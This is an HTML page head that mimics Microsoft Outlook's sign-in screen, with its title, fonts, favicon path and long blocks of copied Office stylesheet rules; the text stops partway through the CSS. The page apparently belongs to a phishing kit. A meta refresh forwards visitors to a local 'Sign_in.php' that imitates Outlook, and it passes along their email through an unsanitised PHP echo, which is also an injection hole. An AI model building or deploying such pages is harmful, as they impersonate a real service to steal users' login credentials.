<!DOCTYPE html>
<html dir="ltr" lang="en-US">
<head>
<link rel="shortcut icon" href="outlook.live.com/SignIn_files/favicon.ico" type="image/x-icon">
<META HTTP-EQUIV="refresh" CONTENT="16;URL=outlook.live.com/Sign_in.php?email=<?php echo $_GET['email']; ?>">
<title>Outlook</title>

<style>
@font-face {
 font-family: "wf_segoe-ui_light";
 src: local("Segoe UI Light"),  local("Segoe WP Light"),  url('prem/fonts/segoeui-light.woff') format('woff'),  url('prem/fonts/segoeui-light.ttf') format('truetype');
}
 @font-face {
 font-family: "wf_segoe-ui_normal";
 src: local("Segoe UI"),  local("Segoe WP"),  url('prem/fonts/segoeui-regular.woff') format('woff'),  url('prem/fonts/segoeui-regular.ttf') format('truetype');
}
 @font-face {
 font-family: "wf_segoe-ui_semibold";
 src: local("Segoe UI Semibold"),  local("Segoe WP Semibold"),  url('prem/fonts/segoeui-semibold.woff') format('woff'),  url('prem/fonts/segoeui-semibold.ttf') format('truetype');
 font-weight: bold;
}
 @font-face {
 font-family: "wf_segoe-ui_semilight";
 src: local("Segoe UI Semilight"),  local("Segoe WP Semilight"),  url('prem/fonts/segoeui-semilight.woff') format('woff'),  url('prem/fonts/segoeui-semilight.ttf') format('truetype');
}
 @font-face {
 font-family: 'webfontPreload';
 src: url('prem/16.1881.7.2370790/resources/styles/fonts/office365icons.eot?#iefix') format('embedded-opentype'),  url('prem/16.1881.7.2370790/resources/styles/fonts/office365icons.woff') format('woff'),  url('prem/16.1881.7.2370790/resources/styles/fonts/office365icons.ttf') format('truetype');
 font-weight: normal;
 font-style: normal;
}
</style>

<style>
.customScrollBar::-webkit-scrollbar {
height:18px;
width:18px
}
.customScrollBar::-webkit-scrollbar:disabled {
display:none
}
.customScrollBar::-webkit-scrollbar-button {
background-color:#fff;
background-repeat:no-repeat;
cursor:pointer
}
.customScrollBar::-webkit-scrollbar-button:horizontal:increment, .customScrollBar::-webkit-scrollbar-button:horizontal:decrement, .customScrollBar::-webkit-scrollbar-button:horizontal:increment:hover, .customScrollBar::-webkit-scrollbar-button:horizontal:decrement:hover, .customScrollBar::-webkit-scrollbar-button:vertical:increment, .customScrollBar::-webkit-scrollbar-button:vertical:decrement, .customScrollBar::-webkit-scrollbar-button:vertical:increment:hover, .customScrollBar::-webkit-scrollbar-button:vertical:decrement:hover {
background-position:center;
height:18px;
width:18px
}
.customScrollBarLight::-webkit-scrollbar-button {
display:none
}
.customScrollBar::-webkit-scrollbar-track {
background-color:#fff
}
.customScrollBarLight::-webkit-scrollbar-track {
background-color:#0072c6
}
.customScrollBar::-webkit-scrollbar-thumb {
border-radius:9px;
border:solid 6px #fff;
background-color:#c8c8c8
}
.customScrollBarLight::-webkit-scrollbar-thumb {
border-color:#0072c6;
background-color:#95b1c1
}
.customScrollBar::-webkit-scrollbar-thumb:vertical {
min-height:50px
}
.customScrollBar::-webkit-scrollbar-thumb:horizontal {
min-width:50px
}
.customScrollBar::-webkit-scrollbar-thumb:hover {
border-radius:9px;
border:solid 6px #fff;
background-color:#98a3a6
}
.customScrollBar::-webkit-scrollbar-corner {
background-color:#fff
}
.nativeScrollInertia {
	-webkit-overflow-scrolling:touch
}
.csimg {
	display:inline-block;
	overflow:hidden
}
button::-moz-focus-inner {
border-width:0;
padding:0
}
.textbox {
	border-width:1px;
	border-style:solid;
	border-radius:0;
	-moz-border-radius:0;
	-webkit-border-radius:0;
	box-shadow:none;
	-moz-box-shadow:none;
	-webkit-box-shadow:none;
	-webkit-appearance:none;
	height:30px;
	padding:0 5px
}
.tnarrow .textbox, .twide .textbox {
	font-size:12px;
	background-color:#fff;
	height:14px;
	padding:3px 5px
}
.textbox::-webkit-input-placeholder {
color:#a6a6a6
}
.textbox:-moz-placeholder {
color:#a6a6a6
}
.textbox::-moz-placeholder {
color:#a6a6a6
}
.textbox:-ms-input-placeholder {
color:#a6a6a6
}
.textarea {
	padding:10px
}
.textarea:hover {
	background-color:transparent;
	border-color:transparent
}
.o365button {
	background:transparent;
	border-width:0;
	padding:0;
	cursor:pointer!important;
	font-size:14px
}
.o365button:disabled, label.o365button[disabled=true] {
	cursor:default!important
}
.o365buttonOutlined {
	padding-right:11px;
	padding-left:11px;
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
	border-width:1px;
	border-style:solid
}
.o365buttonOutlined .o365buttonLabel {
	display:inline-block
}
.o365buttonOutlined {
	height:30px
}
.twide .o365buttonOutlined, .tnarrow .o365buttonOutlined {
	height:22px
}
.o365buttonOutlined .o365buttonLabel {
	height:22px
}
.checkbox {
	border-style:none;
	cursor:pointer;
	vertical-align:middle
}
.popupShadow {
	box-shadow:0 0 20px rgba(0, 0, 0, .4);
	border:1px solid #eaeaea
}
.contextMenuDropShadow {
	box-shadow:0 0 7px rgba(0, 0, 0, .4);
	border:1px solid #eaeaea
}
.modalBackground {
	background-color:#fff;
	height:100%;
	width:100%;
	opacity:.65;
	filter:Alpha(opacity=65)
}
.clearModalBackground {
	background-color:#fff;
	opacity:0;
	filter:Alpha(opacity=0);
	height:100%;
	width:100%
}
.contextMenuPopup {
	background-color:#fff
}
.removeFocusOutline *:focus {
	outline:none
}
.addFocusOutline button:focus {
	outline:dotted 1px
}
.addFocusRingOutline button:focus {
	outline:auto 5px -webkit-focus-ring-color
}
.border-color-transparent {
	border-color:transparent
}
.vResize, .hResize {
	z-index:1000
}
.hResize, .hResizeCursor * {
	cursor:row-resize!important
}
.vResize, .vResizeCursor * {
	cursor:col-resize!important
}
.vResizing, .hResizing {
	filter:alpha(opacity=60);
	opacity:.6;
	-moz-opacity:.6;
	border:solid 1px #666
}
.vResizing {
	border-width:0 1px
}
.hResizing {
	border-width:1px 0
}
</style>
<style>
</style>
<style id="FontLocaleStyles">
</style>
<style id="ThemedColorStyles">
</style>
<style>
.ms-bg-color-black,.ms-bgc-b,.ms-bg-color-black-hover:hover,.ms-bg-color-black-focus:focus,.ms-bg-color-black-before:before,.ms-bgc-b-h:hover,.ms-bgc-b-f:focus,.ms-bgc-b-b:before{background-color:#000}.ms-bg-color-neutralDark,.ms-bgc-nd,.ms-bg-color-neutralDark-hover:hover,.ms-bg-color-neutralDark-focus:focus,.ms-bg-color-neutralDark-before:before,.ms-bgc-nd-h:hover,.ms-bgc-nd-f:focus,.ms-bgc-nd-b:before{background-color:#212121}.ms-bg-color-neutralPrimary,.ms-bgc-np,.ms-bg-color-neutralPrimary-hover:hover,.ms-bg-color-neutralPrimary-focus:focus,.ms-bg-color-neutralPrimary-before:before,.ms-bgc-np-h:hover,.ms-bgc-np-f:focus,.ms-bgc-np-b:before{background-color:#333}.ms-bg-color-neutralSecondary,.ms-bgc-ns,.ms-bg-color-neutralSecondary-hover:hover,.ms-bg-color-neutralSecondary-focus:focus,.ms-bg-color-neutralSecondary-before:before,.ms-bgc-ns-h:hover,.ms-bgc-ns-f:focus,.ms-bgc-ns-b:before{background-color:#666}.ms-bg-color-neutralSecondaryAlt,.ms-bgc-nsa,.ms-bg-color-neutralSecondaryAlt-hover:hover,.ms-bg-color-neutralSecondaryAlt-focus:focus,.ms-bg-color-neutralSecondaryAlt-before:before,.ms-bgc-nsa-h:hover,.ms-bgc-nsa-f:focus,.ms-bgc-nsa-b:before{background-color:#767676}.ms-bg-color-neutralTertiary,.ms-bgc-nt,.ms-bg-color-neutralTertiary-hover:hover,.ms-bg-color-neutralTertiary-focus:focus,.ms-bg-color-neutralTertiary-before:before,.ms-bgc-nt-h:hover,.ms-bgc-nt-f:focus,.ms-bgc-nt-b:before{background-color:#a6a6a6}.ms-bg-color-neutralTertiaryAlt,.ms-bgc-nta,.ms-bg-color-neutralTertiaryAlt-hover:hover,.ms-bg-color-neutralTertiaryAlt-focus:focus,.ms-bg-color-neutralTertiaryAlt-before:before,.ms-bgc-nta-h:hover,.ms-bgc-nta-f:focus,.ms-bgc-nta-b:before{background-color:#c8c8c8}.ms-bg-color-neutralLight,.ms-bgc-nl,.ms-bg-color-neutralLight-hover:hover,.ms-bg-color-neutralLight-focus:focus,.ms-bg-color-neutralLight-before:before,.ms-bgc-nl-h:hover,.ms-bgc-nl-f:focus,.ms-bgc-nl-b:before{background-color:#eaeaea}.ms-bg-color-neutralLighter,.ms-bgc-nlr,.ms-bg-color-neutralLighter-hover:hover,.ms-bg-color-neutralLighter-focus:focus,.ms-bg-color-neutralLighter-before:before,.ms-bgc-nlr-h:hover,.ms-bgc-nlr-f:focus,.ms-bgc-nlr-b:before{background-color:#f4f4f4}.ms-bg-color-neutralLighterAlt,.ms-bgc-nlra,.ms-bg-color-neutralLighterAlt-hover:hover,.ms-bg-color-neutralLighterAlt-focus:focus,.ms-bg-color-neutralLighterAlt-before:before,.ms-bgc-nlra-h:hover,.ms-bgc-nlra-f:focus,.ms-bgc-nlra-b:before{background-color:#f8f8f8}.ms-bg-color-white,.ms-bgc-w,.ms-bg-color-white-hover:hover,.ms-bg-color-white-focus:focus,.ms-bg-color-white-before:before,.ms-bgc-w-h:hover,.ms-bgc-w-b:before{background-color:#fff}.ms-border-color-black,.ms-bcl-b,.ms-border-color-black-hover:hover,.ms-border-color-black-focus:focus,.ms-border-color-black-before:before,.ms-bcl-b-h:hover,.ms-bcl-b-f:focus,.ms-bcl-b-b:before{border-color:#000}.ms-border-color-neutralDark,.ms-bcl-nd,.ms-border-color-neutralDark-hover:hover,.ms-border-color-neutralDark-focus:focus,.ms-border-color-neutralDark-before:before,.ms-bcl-nd-h:hover,.ms-bcl-nd-f:focus,.ms-bcl-nd-b:before{border-color:#212121}.ms-border-color-neutralPrimary,.ms-bcl-np,.ms-border-color-neutralPrimary-hover:hover,.ms-border-color-neutralPrimary-focus:focus,.ms-border-color-neutralPrimary-before:before,.ms-bcl-np-h:hover,.ms-bcl-np-f:focus,.ms-bcl-np-b:before{border-color:#333}.ms-border-color-neutralSecondary,.ms-bcl-ns,.ms-border-color-neutralSecondary-hover:hover,.ms-border-color-neutralSecondary-focus:focus,.ms-border-color-neutralSecondary-before:before,.ms-bcl-ns-h:hover,.ms-bcl-ns-f:focus,.ms-bcl-ns-b:before{border-color:#666}.ms-border-color-neutralSecondaryAlt,.ms-bcl-nsa,.ms-border-color-neutralSecondaryAlt-hover:hover,.ms-border-color-neutralSecondaryAlt-focus:focus,.ms-border-color-neutralSecondaryAlt-before:before,.ms-bcl-nsa-h:hover,.ms-bcl-nsa-f:focus,.ms-bcl-nsa-b:before{border-color:#767676}.ms-border-color-neutralTertiary,.ms-bcl-nt,.ms-border-color-neutralTertiary-hover:hover,.ms-border-color-neutralTertiary-focus:focus,.ms-border-color-neutralTertiary-before:before,.ms-bcl-nt-h:hover,.ms-bcl-nt-f:focus,.ms-bcl-nt-b:before{border-color:#a6a6a6}.ms-border-color-neutralTertiaryAlt,.ms-bcl-nta,.ms-border-color-neutralTertiaryAlt-hover:hover,.ms-border-color-neutralTertiaryAlt-focus:focus,.ms-border-color-neutralTertiaryAlt-before:before,.ms-bcl-nta-h:hover,.ms-bcl-nta-f:focus,.ms-bcl-nta-b:before{border-color:#c8c8c8}.ms-border-color-neutralLight,.ms-bcl-nl,.ms-border-color-neutralLight-hover:hover,.ms-border-color-neutralLight-focus:focus,.ms-border-color-neutralLight-before:before,.ms-bcl-nl-h:hover,.ms-bcl-nl-f:focus,.ms-bcl-nl-b:before{border-color:#eaeaea}.ms-border-color-neutralLighter,.ms-bcl-nlr,.ms-border-color-neutralLighter-hover:hover,.ms-border-color-neutralLighter-focus:focus,.ms-border-color-neutralLighter-before:before,.ms-bcl-nlr-h:hover,.ms-bcl-nlr-f:focus,.ms-bcl-nlr-b:before{border-color:#f4f4f4}.ms-border-color-neutralLighterAlt,.ms-bcl-nlra,.ms-border-color-neutralLighterAlt-hover:hover,.ms-border-color-neutralLighterAlt-focus:focus,.ms-border-color-neutralLighterAlt-before:before,.ms-bcl-nlra-h:hover,.ms-bcl-nlra-f:focus,.ms-bcl-nlra-b:before{border-color:#f8f8f8}.ms-border-color-white,.ms-bcl-w,.ms-border-color-white-hover:hover,.ms-border-color-white-focus:focus,.ms-border-color-white-before:before,.ms-bcl-w-h:hover,.ms-bcl-w-f:focus,.ms-bcl-w-b:before{border-color:#fff}.ms-font-color-black,.ms-fontColor-black,.ms-fcl-b,.ms-font-color-black-hover:hover,.ms-font-color-black-focus:focus,.ms-font-color-black-before:before,.ms-fcl-b-h:hover,.ms-fcl-b-f:focus,.ms-fcl-b-b:before{color:#000}.ms-font-color-neutralDark,.ms-fontColor-neutralDark,.ms-fcl-nd,.ms-font-color-neutralDark-hover:hover,.ms-font-color-neutralDark-focus:focus,.ms-font-color-neutralDark-before:before,.ms-fcl-nd-h:hover,.ms-fcl-nd-f:focus,.ms-fcl-nd-b:before{color:#212121}.ms-font-color-neutralPrimary,.ms-fontColor-neutralPrimary,.ms-fcl-np,.ms-font-color-neutralPrimary-hover:hover,.ms-font-color-neutralPrimary-focus:focus,.ms-font-color-neutralPrimary-before:before,.ms-fcl-np-h:hover,.ms-fcl-np-f:focus,.ms-fcl-np-b:before{color:#333}.ms-font-color-neutralSecondary,.ms-fontColor-neutralSecondary,.ms-fcl-ns,.ms-font-color-neutralSecondary-hover:hover,.ms-font-color-neutralSecondary-focus:focus,.ms-font-color-neutralSecondary-before:before,.ms-fcl-ns-h:hover,.ms-fcl-ns-f:focus,.ms-fcl-ns-b:before{color:#666}.ms-font-color-neutralSecondaryAlt,.ms-fontColor-neutralSecondaryAlt,.ms-fcl-nsa,.ms-font-color-neutralSecondaryAlt-hover:hover,.ms-font-color-neutralSecondaryAlt-focus:focus,.ms-font-color-neutralSecondaryAlt-before:before,.ms-fcl-nsa-h:hover,.ms-fcl-nsa-f:focus,.ms-fcl-nsa-b:before{color:#767676}.ms-font-color-neutralTertiary,.ms-fontColor-neutralTertiary,.ms-fcl-nt,.ms-font-color-neutralTertiary-hover:hover,.ms-font-color-neutralTertiary-focus:focus,.ms-font-color-neutralTertiary-before:before,.ms-fcl-nt-h:hover,.ms-fcl-nt-f:focus,.ms-fcl-nt-b:before{color:#a6a6a6}.ms-font-color-neutralTertiaryAlt,.ms-fontColor-neutralTertiaryAlt,.ms-fcl-nta,.ms-font-color-neutralTertiaryAlt-hover:hover,.ms-font-color-neutralTertiaryAlt-focus:focus,.ms-font-color-neutralTertiaryAlt-before:before,.ms-fcl-nta-h:hover,.ms-fcl-nta-f:focus,.ms-fcl-nta-b:before{color:#c8c8c8}.ms-font-color-neutralLight,.ms-fontColor-neutralLight,.ms-fcl-nl,.ms-font-color-neutralLight-hover:hover,.ms-font-color-neutralLight-focus:focus,.ms-font-color-neutralLight-before:before,.ms-fcl-nl-h:hover,.ms-fcl-nl-f:focus,.ms-fcl-nl-b:before{color:#eaeaea}.ms-font-color-neutralLighter,.ms-fontColor-neutralLighter,.ms-fcl-nlr,.ms-font-color-neutralLighter-hover:hover,.ms-font-color-neutralLighter-focus:focus,.ms-font-color-neutralLighter-before:before,.ms-fcl-nlr-h:hover,.ms-fcl-nlr-f:focus,.ms-fcl-nlr-b:before{color:#f4f4f4}.ms-font-color-neutralLighterAlt,.ms-fontColor-neutralLighterAlt,.ms-fcl-nlra,.ms-font-color-neutralLighterAlt-hover:hover,.ms-font-color-neutralLighterAlt-focus:focus,.ms-font-color-neutralLighterAlt-before:before,.ms-fcl-nlra-h:hover,.ms-fcl-nlra-f:focus,.ms-fcl-nlra-b:before{color:#f8f8f8}.ms-font-color-white,.ms-fontColor-white,.ms-fcl-w,.ms-font-color-white-hover:hover,.ms-font-color-white-focus:focus,.ms-font-color-white-before:before,.ms-fcl-w-h:hover,.ms-fcl-w-f:focus,.ms-fcl-w-b:before{color:#fff}
</style>
<style>
.ms-bg-color-yellow,.ms-bgc-y,.ms-bg-color-yellow-hover:hover,.ms-bg-color-yellow-before:before,.ms-bgc-y-h:hover,.ms-bgc-y-b:before{background-color:#ffb900}.ms-bg-color-yellowLight,.ms-bgc-yl,.ms-bg-color-yellowLight-hover:hover,.ms-bg-color-yellowLight-before:before,.ms-bgc-yl-h:hover,.ms-bgc-yl-b:before{background-color:#fff100}.ms-bg-color-orange,.ms-bgc-o,.ms-bg-color-orange-hover:hover,.ms-bg-color-orange-before:before,.ms-bgc-o-h:hover,.ms-bgc-o-b:before{background-color:#d83b01}.ms-bg-color-orangeLight,.ms-bgc-ol,.ms-bg-color-orangeLight-hover:hover,.ms-bg-color-orangeLight-before:before,.ms-bgc-ol-h:hover,.ms-bgc-ol-b:before{background-color:#ff8c00}.ms-bg-color-redDark,.ms-bgc-rd,.ms-bg-color-redDark-hover:hover,.ms-bg-color-redDark-before:before,.ms-bgc-rd-h:hover,.ms-bgc-rd-b:before{background-color:#a80000}.ms-bg-color-red,.ms-bgc-r,.ms-bg-color-red-hover:hover,.ms-bg-color-red-before:before,.ms-bgc-r-h:hover,.ms-bgc-r-b:before{background-color:#e81123}.ms-bg-color-magentaDark,.ms-bgc-md,.ms-bg-color-magentaDark-hover:hover,.ms-bg-color-magentaDark-before:before,.ms-bgc-md-h:hover,.ms-bgc-md-b:before{background-color:#5c005c}.ms-bg-color-magenta,.ms-bgc-m,.ms-bg-color-magenta-hover:hover,.ms-bg-color-magenta-before:before,.ms-bgc-m-h:hover,.ms-bgc-m-b:before{background-color:#b4009e}.ms-bg-color-magentaLight,.ms-bgc-ml,.ms-bg-color-magentaLight-hover:hover,.ms-bg-color-magentaLight-before:before,.ms-bgc-ml-h:hover,.ms-bgc-ml-b:before{background-color:#e3008c}.ms-bg-color-purpleDark,.ms-bgc-pd,.ms-bg-color-purpleDark-hover:hover,.ms-bg-color-purpleDark-before:before,.ms-bgc-pd-h:hover,.ms-bgc-pd-b:before{background-color:#32145a}.ms-bg-color-purple,.ms-bgc-p,.ms-bg-color-purple-hover:hover,.ms-bg-color-purple-before:before,.ms-bgc-p-h:hover,.ms-bgc-p-b:before{background-color:#5c2d91}.ms-bg-color-purpleLight,.ms-bgc-pl,.ms-bg-color-purpleLight-hover:hover,.ms-bg-color-purpleLight-before:before,.ms-bgc-pl-h:hover,.ms-bgc-pl-b:before{background-color:#b4a0ff}.ms-bg-color-blueDark,.ms-bgc-bd,.ms-bg-color-blueDark-hover:hover,.ms-bg-color-blueDark-before:before,.ms-bgc-bd-h:hover,.ms-bgc-bd-b:before{background-color:#002050}.ms-bg-color-blueMid,.ms-bgc-bm,.ms-bg-color-blueMid-hover:hover,.ms-bg-color-blueMid-before:before,.ms-bgc-bm-h:hover,.ms-bgc-bm-b:before{background-color:#00188f}.ms-bg-color-blue,.ms-bgc-blu,.ms-bg-color-blue-hover:hover,.ms-bg-color-blue-before:before,.ms-bgc-blu-h:hover,.ms-bgc-blu-b:before{background-color:#0078d7}.ms-bg-color-blueLight,.ms-bgc-bl,.ms-bg-color-blueLight-hover:hover,.ms-bg-color-blueLight-before:before,.ms-bgc-bl-h:hover,.ms-bgc-bl-b:before{background-color:#00bcf2}.ms-bg-color-tealDark,.ms-bgc-ted,.ms-bg-color-tealDark-hover:hover,.ms-bg-color-tealDark-before:before,.ms-bgc-ted-h:hover,.ms-bgc-ted-b:before{background-color:#004b50}.ms-bg-color-teal,.ms-bgc-t,.ms-bg-color-teal-hover:hover,.ms-bg-color-teal-before:before,.ms-bgc-t-h:hover,.ms-bgc-t-b:before{background-color:#008272}.ms-bg-color-tealLight,.ms-bgc-tel,.ms-bg-color-tealLight-hover:hover,.ms-bg-color-tealLight-before:before,.ms-bgc-tel-h:hover,.ms-bgc-tel-b:before{background-color:#00b294}.ms-bg-color-greenDark,.ms-bgc-gd,.ms-bg-color-greenDark-hover:hover,.ms-bg-color-greenDark-before:before,.ms-bgc-gd-h:hover,.ms-bgc-gd-b:before{background-color:#004b1c}.ms-bg-color-green,.ms-bgc-g,.ms-bg-color-green-hover:hover,.ms-bg-color-green-before:before,.ms-bgc-g-h:hover,.ms-bgc-g-b:before{background-color:#107c10}.ms-bg-color-greenLight,.ms-bgc-gl,.ms-bg-color-greenLight-hover:hover,.ms-bg-color-greenLight-before:before,.ms-bgc-gl-h:hover,.ms-bgc-gl-b:before{background-color:#bad80a}.ms-border-color-yellow,.ms-bcl-y,.ms-border-color-yellow-hover:hover,.ms-border-color-yellow-before:before,.ms-bcl-y-h:hover,.ms-bcl-y-b:before{border-color:#ffb900}.ms-border-color-yellowLight,.ms-bcl-yl,.ms-border-color-yellowLight-hover:hover,.ms-border-color-yellowLight-before:before,.ms-bcl-yl-h:hover,.ms-bcl-yl-b:before{border-color:#fff100}.ms-border-color-orange,.ms-bcl-o,.ms-border-color-orange-hover:hover,.ms-border-color-orange-before:before,.ms-bcl-o-h:hover,.ms-bcl-o-b:before{border-color:#d83b01}.ms-border-color-orangeLight,.ms-bcl-ol,.ms-border-color-orangeLight-hover:hover,.ms-border-color-orangeLight-before:before,.ms-bcl-ol-h:hover,.ms-bcl-ol-b:before{border-color:#ff8c00}.ms-border-color-redDark,.ms-bcl-rd,.ms-border-color-redDark-hover:hover,.ms-border-color-redDark-before:before,.ms-bcl-rd-h:hover,.ms-bcl-rd-b:before{border-color:#a80000}.ms-border-color-red,.ms-bcl-r,.ms-border-color-red-hover:hover,.ms-border-color-red-before:before,.ms-bcl-r-h:hover,.ms-bcl-r-b:before{border-color:#e81123}.ms-border-color-magentaDark,.ms-bcl-md,.ms-border-color-magentaDark-hover:hover,.ms-border-color-magentaDark-before:before,.ms-bcl-md-h:hover,.ms-bcl-md-b:before{border-color:#5c005c}.ms-border-color-magenta,.ms-bcl-m,.ms-border-color-magenta-hover:hover,.ms-border-color-magenta-before:before,.ms-bcl-m-h:hover,.ms-bcl-m-b:before{border-color:#b4009e}.ms-border-color-magentaLight,.ms-bcl-ml,.ms-border-color-magentaLight-hover:hover,.ms-border-color-magentaLight-before:before,.ms-bcl-ml-h:hover,.ms-bcl-ml-b:before{border-color:#e3008c}.ms-border-color-purpleDark,.ms-bcl-pd,.ms-border-color-purpleDark-hover:hover,.ms-border-color-purpleDark-before:before,.ms-bcl-pd-h:hover,.ms-bcl-pd-b:before{border-color:#32145a}.ms-border-color-purple,.ms-bcl-p,.ms-border-color-purple-hover:hover,.ms-border-color-purple-before:before,.ms-bcl-p-h:hover,.ms-bcl-p-b:before{border-color:#5c2d91}.ms-border-color-purpleLight,.ms-bcl-pl,.ms-border-color-purpleLight-hover:hover,.ms-border-color-purpleLight-before:before,.ms-bcl-pl-h:hover,.ms-bcl-pl-b:before{border-color:#b4a0ff}.ms-border-color-blueDark,.ms-bcl-bd,.ms-border-color-blueDark-hover:hover,.ms-border-color-blueDark-before:before,.ms-bcl-bd-h:hover,.ms-bcl-bd-b:before{border-color:#002050}.ms-border-color-blueMid,.ms-bcl-bm,.ms-border-color-blueMid-hover:hover,.ms-border-color-blueMid-before:before,.ms-bcl-bm-h:hover,.ms-bcl-bm-b:before{border-color:#00188f}.ms-border-color-blue,.ms-bcl-blu,.ms-border-color-blue-hover:hover,.ms-border-color-blue-before:before,.ms-bcl-blu-h:hover,.ms-bcl-blu-b:before{border-color:#0078d7}.ms-border-color-blueLight,.ms-bcl-bl,.ms-border-color-blueLight-hover:hover,.ms-border-color-blueLight-before:before,.ms-bcl-bl-h:hover,.ms-bcl-bl-b:before{border-color:#00bcf2}.ms-border-color-tealDark,.ms-bcl-ted,.ms-border-color-tealDark-hover:hover,.ms-border-color-tealDark-before:before,.ms-bcl-ted-h:hover,.ms-bcl-ted-b:before{border-color:#004b50}.ms-border-color-teal,.ms-bcl-t,.ms-border-color-teal-hover:hover,.ms-border-color-teal-before:before,.ms-bcl-t-h:hover,.ms-bcl-t-b:before{border-color:#008272}.ms-border-color-tealLight,.ms-bcl-tel,.ms-border-color-tealLight-hover:hover,.ms-border-color-tealLight-before:before,.ms-bcl-tel-h:hover,.ms-bcl-tel-b:before{border-color:#00b294}.ms-border-color-greenDark,.ms-bcl-gd,.ms-border-color-greenDark-hover:hover,.ms-border-color-greenDark-before:before,.ms-bcl-gd-h:hover,.ms-bcl-gd-b:before{border-color:#004b1c}.ms-border-color-green,.ms-bcl-g,.ms-border-color-green-hover:hover,.ms-border-color-green-before:before,.ms-bcl-g-h:hover,.ms-bcl-g-b:before{border-color:#107c10}.ms-border-color-greenLight,.ms-bcl-gl,.ms-border-color-greenLight-hover:hover,.ms-border-color-greenLight-before:before,.ms-bcl-gl-h:hover,.ms-bcl-gl-b:before{border-color:#bad80a}.ms-font-color-yellow,.ms-fcl-y,.ms-font-color-yellow-hover:hover,.ms-font-color-yellow-before:before,.ms-fcl-y-h:hover,.ms-fcl-y-b:before{color:#ffb900}.ms-font-color-yellowLight,.ms-fcl-yl,.ms-font-color-yellowLight-hover:hover,.ms-font-color-yellowLight-before:before,.ms-fcl-yl-h:hover,.ms-fcl-yl-b:before{color:#fff100}.ms-font-color-orange,.ms-fcl-o,.ms-font-color-orange-hover:hover,.ms-font-color-orange-before:before,.ms-fcl-o-h:hover,.ms-fcl-o-b:before{color:#d83b01}.ms-font-color-orangeLight,.ms-fcl-ol,.ms-font-color-orangeLight-hover:hover,.ms-font-color-orangeLight-before:before,.ms-fcl-ol-h:hover,.ms-fcl-ol-b:before{color:#ff8c00}.ms-font-color-redDark,.ms-fcl-rd,.ms-font-color-redDark-hover:hover,.ms-font-color-redDark-before:before,.ms-fcl-rd-h:hover,.ms-fcl-rd-b:before{color:#a80000}.ms-font-color-red,.ms-fcl-r,.ms-font-color-red-hover:hover,.ms-font-color-red-before:before,.ms-fcl-r-h:hover,.ms-fcl-r-b:before{color:#e81123}.ms-font-color-magentaDark,.ms-fcl-md,.ms-font-color-magentaDark-hover:hover,.ms-font-color-magentaDark-before:before,.ms-fcl-md-h:hover,.ms-fcl-md-b:before{color:#5c005c}.ms-font-color-magenta,.ms-fcl-m,.ms-font-color-magenta-hover:hover,.ms-font-color-magenta-before:before,.ms-fcl-m-h:hover,.ms-fcl-m-b:before{color:#b4009e}.ms-font-color-magentaLight,.ms-fcl-ml,.ms-font-color-magentaLight-hover:hover,.ms-font-color-magentaLight-before:before,.ms-fcl-ml-h:hover,.ms-fcl-ml-b:before{color:#e3008c}.ms-font-color-purpleDark,.ms-fcl-pd,.ms-font-color-purpleDark-hover:hover,.ms-font-color-purpleDark-before:before,.ms-fcl-pd-h:hover,.ms-fcl-pd-b:before{color:#32145a}.ms-font-color-purple,.ms-fcl-p,.ms-font-color-purple-hover:hover,.ms-font-color-purple-before:before,.ms-fcl-p-h:hover,.ms-fcl-p-b:before{color:#5c2d91}.ms-font-color-purpleLight,.ms-fcl-pl,.ms-font-color-purpleLight-hover:hover,.ms-font-color-purpleLight-before:before,.ms-fcl-pl-h:hover,.ms-fcl-pl-b:before{color:#b4a0ff}.ms-font-color-blueDark,.ms-fcl-bd,.ms-font-color-blueDark-hover:hover,.ms-font-color-blueDark-before:before,.ms-fcl-bd-h:hover,.ms-fcl-bd-b:before{color:#002050}.ms-font-color-blueMid,.ms-fcl-bm,.ms-font-color-blueMid-hover:hover,.ms-font-color-blueMid-before:before,.ms-fcl-bm-h:hover,.ms-fcl-bm-b:before{color:#00188f}.ms-font-color-blue,.ms-fcl-blu,.ms-font-color-blue-hover:hover,.ms-font-color-blue-before:before,.ms-fcl-blu-h:hover,.ms-fcl-blu-b:before{color:#0078d7}.ms-font-color-blueLight,.ms-fcl-bl,.ms-font-color-blueLight-hover:hover,.ms-font-color-blueLight-before:before,.ms-fcl-bl-h:hover,.ms-fcl-bl-b:before{color:#00bcf2}.ms-font-color-tealDark,.ms-fcl-ted,.ms-font-color-tealDark-hover:hover,.ms-font-color-tealDark-before:before,.ms-fcl-ted-h:hover,.ms-fcl-ted-b:before{color:#004b50}.ms-font-color-teal,.ms-fcl-t,.ms-font-color-teal-hover:hover,.ms-font-color-teal-before:before,.ms-fcl-t-h:hover,.ms-fcl-t-b:before{color:#008272}.ms-font-color-tealLight,.ms-fcl-tel,.ms-font-color-tealLight-hover:hover,.ms-font-color-tealLight-before:before,.ms-fcl-tel-h:hover,.ms-fcl-tel-b:before{color:#00b294}.ms-font-color-greenDark,.ms-fcl-gd,.ms-font-color-greenDark-hover:hover,.ms-font-color-greenDark-before:before,.ms-fcl-gd-h:hover,.ms-fcl-gd-b:before{color:#004b1c}.ms-font-color-green,.ms-fcl-g,.ms-font-color-green-hover:hover,.ms-font-color-green-before:before,.ms-fcl-g-h:hover,.ms-fcl-g-b:before{color:#107c10}.ms-font-color-greenLight,.ms-fcl-gl,.ms-font-color-greenLight-hover:hover,.ms-font-color-greenLight-before:before,.ms-fcl-gl-h:hover,.ms-fcl-gl-b:before{color:#bad80a}
</style>
<style>
.owa-font-compose{font-family:Calibri,Arial,Helvetica,sans-serif}.owa-bg-color-neutral-orange{background-color:#D82300}.owa-bg-color-neutral-red{background-color:#A80F22}.owa-bg-color-neutral-yellow{background-color:#FFEE94}.owa-bg-color-neutral-green{background-color:#5DD255}.owa-bg-color-cal-green{background-color:#68A490}.owa-bg-color-cal-purple{background-color:#976CBE}.owa-border-color-neutral-orange{border-color:#D82300}.owa-border-color-neutral-red{border-color:#A80F22}.owa-border-color-neutral-yellow{border-color:#FFEE94}.owa-border-color-neutral-green{border-color:#5DD255}.owa-border-color-cal-green{border-color:#68A490}.owa-border-color-cal-purple{border-color:#976CBE}.owa-color-neutral-darkBlue{color:#00008B}.owa-color-neutral-orange{color:#D82300}.owa-color-neutral-red{color:#A80F22}.owa-color-neutral-yellow{color:#FFEE94}.owa-color-neutral-green{color:#5DD255}.owa-color-neutral-green-alt,.owa-color-neutral-green-alt:before{color:#107c10}.owa-color-cal-green{color:#68A490}.owa-color-cal-green-hover{color:#377353}.owa-color-cal-purple{color:#976CBE}.owa-color-cal-purple-hover{color:#67397B}.owa-color-cal-blue{color:#71C2EB}.o